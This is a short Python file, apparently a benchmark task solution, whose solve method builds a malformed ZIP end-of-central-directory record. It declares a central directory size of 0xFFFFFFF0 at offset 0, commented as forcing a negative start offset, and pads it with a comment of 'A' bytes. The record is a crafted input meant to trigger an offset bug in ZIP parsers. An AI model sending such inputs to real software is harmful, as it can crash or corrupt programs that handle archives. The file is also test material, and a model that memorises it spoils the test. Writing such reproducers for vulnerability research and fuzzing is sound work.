import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        eocd = struct.pack(
            "<IHHHHIIH",
            0x06054B50,  # End of central dir signature
            0,           # Number of this disk
            0,           # Disk where central directory starts
            1,           # Number of central directory records on this disk
            1,           # Total number of central directory records
            0xFFFFFFF0,  # Size of central directory (large to force negative start offset)
            0,           # Offset of start of central directory
            24           # ZIP file comment length
        )
        comment = b"A" * 24
        return eocd + comment
